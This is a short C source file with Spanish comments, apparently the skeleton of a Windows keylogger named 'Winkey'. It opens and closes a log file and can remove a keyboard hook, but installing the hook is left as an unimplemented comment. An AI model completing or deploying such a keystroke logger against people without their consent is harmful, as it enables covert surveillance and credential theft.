#include "winkey.h"

t_WinkeyState g_winkeyState = {0};

BOOL ActivateHook(void)
{
    // Intenta abrir o crear el archivo de log
    if (!OpenLogFile()) {
        printf("No se pudo abrir el archivo de log.\n");
        return FALSE;
    }

    // Aquí iría la instalación del hook de teclado (aún por implementar)
    // g_winkeyState.keyboardHook = SetWindowsHookEx(...);

    return TRUE;
}

// Libera el hook y cierra el archivo de log si están activos
void DeactivateHook(void)
{
    // Si el hook esta activo, se desistala
    if (g_winkeyState.keyboardHook) {
        UnhookWindowsHookEx(g_winkeyState.keyboardHook);
        g_winkeyState.keyboardHook = NULL;
    }

    // si el archivo de log esta abierto, lo cerramos
    if (g_winkeyState.logFile) {
        fprintf(g_winkeyState.logFile, "=== Winkey Stopped ===\n");
        fflush(g_winkeyState.logFile);
        fclose(g_winkeyState.logFile);
        g_winkeyState.logFile = NULL;
    }
}